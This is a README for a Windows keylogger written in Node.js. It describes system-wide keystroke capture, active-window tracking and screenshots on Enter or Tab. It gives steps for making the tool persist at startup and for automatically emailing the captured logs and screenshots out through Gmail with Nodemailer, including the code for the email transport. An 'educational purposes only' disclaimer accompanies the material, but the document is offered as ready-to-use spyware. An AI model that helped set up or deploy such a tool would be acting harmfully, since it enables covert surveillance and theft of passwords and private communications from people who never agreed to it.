# KeyLogger.js

## Description

This project is a global keylogger for Windows built with Node.js. It captures all keyboard input, logs keystrokes, tracks the active window, and takes a screenshot each time the user presses Enter or Tab. The script saves these logs and screenshots in organized folders and sends them via email using Nodemailer.

> **⚠️ Disclaimer:**  
> This code is for educational purposes only. Do not use it for unauthorized monitoring or malicious activities. Unauthorized use may violate privacy laws and GitHub's Acceptable Use Policies.

---

## How to Run

1. **To enable/run the script:**
    - Open `start.vbs`

2. **If you want it to run on startup:**
    - Create a shortcut of `start.vbs`
    - Open Run (`Win + R`), then paste the shortcut in the folder that opens
    - To check, open Task Manager and go to Startup apps, then look for `start.vbs`
    - You can also enable or disable it in the top right of the Startup tab

---

## Email Setup Instructions

This script uses Gmail to send logs and screenshots.  
**You must set up an App Password for your Gmail account:**

1. Go to your Google Account settings.
2. Enable 2-Step Verification if you haven't already.
3. Go to **Security > App passwords**.
4. Generate a new App Password for "Mail" and "Windows Computer".
5. Copy the generated password.

In the code, find this section:
```javascript
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,  // use SSL
    auth: {
        user: 'your_email@gmail.com',
        pass: 'your_app_password' // Replace with your App Password
    }
});
```
- Replace `'your_email@gmail.com'` with your Gmail address.
- Replace `'your_app_password'` with the App Password you generated.

**Change the sender and receiver email addresses in the `sendEmail` function:**
```javascript
const mailOptions = {
    from: 'your_email@gmail.com',      // Sender email
    to: 'receiver_email@gmail.com',    // Receiver email
    ...
};
```
- Set both `from` and `to` as needed.

---

## How to Exit/Terminate the Script

- **Method 1:**  
  Open Task Manager  
  - Search for `Node.js Run-Time` and end task  
  - Search for `Windows Based Script Host` and end task

- **Method 2:**  
  Press `Ctrl + Shift + Q` on your keyboard

---

## Features

- Global keyboard capture (system-wide)
- Active window tracking
- Screenshot capture on Enter/Tab
- Organized log and screenshot storage
- Automatic email sending of logs and screenshots
- Multiple exit/termination methods

---

## License

This project is licensed under the [MIT License](LICENSE).

---
